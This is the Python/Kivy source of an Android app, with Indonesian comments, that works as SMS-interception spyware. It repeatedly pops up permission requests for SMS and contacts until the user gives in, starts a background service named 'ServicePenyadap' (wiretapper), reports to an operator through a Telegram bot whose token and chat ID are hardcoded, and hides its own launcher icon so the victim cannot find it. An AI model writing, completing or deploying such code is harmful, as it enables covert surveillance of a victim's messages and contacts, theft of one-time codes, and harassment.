import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.clock import Clock
import os

# CONFIG BOT KAMU
TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        # Mulai proses 1 detik setelah buka
        Clock.schedule_once(lambda dt: self.minta_izin(), 1)
        return None

    def minta_izin(self):
        # Daftar izin yang harus didapat
        perms = [
            Permission.READ_SMS,
            Permission.RECEIVE_SMS,
            Permission.POST_NOTIFICATIONS,
            Permission.READ_CONTACTS
        ]
        request_permissions(perms, self.callback_izin)

    def callback_izin(self, permissions, grants):
        if all(grants):
            try:
                # Menjalankan Service di Latar Belakang
                from android import exports
                context = autoclass('org.kivy.android.PythonActivity').mActivity
                service_name = context.getPackageName() + '.ServicePenyadap'
                service = autoclass(service_name)
                service.start(context, "")
                
                bot.send_message(CHAT_ID, "✅ AKSES DITERIMA! Target sudah dalam pantauan.")
                self.eksekusi_hilang()
            except:
                self.eksekusi_hilang()
        else:
            # Jika ditolak, munculkan popup lagi (Teror)
            self.minta_izin()

    def eksekusi_hilang(self):
        try:
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getPackageManager()
            ComponentName = autoclass('android.content.ComponentName')
            comp = ComponentName(activity.getPackageName(), 'org.kivy.android.PythonActivity')
            
            # PROSES HILANGKAN IKON
            pm.setComponentEnabledSetting(comp, 2, 1)
            
            bot.send_message(CHAT_ID, "⚠️ IKON HILANG TOTAL. Monitor SMS sekarang.")
            # Keluar dari aplikasi visual
            Clock.schedule_once(lambda dt: os._exit(0), 2)
        except:
            os._exit(0)

if __name__ == '__main__':
    LOKTV().run()
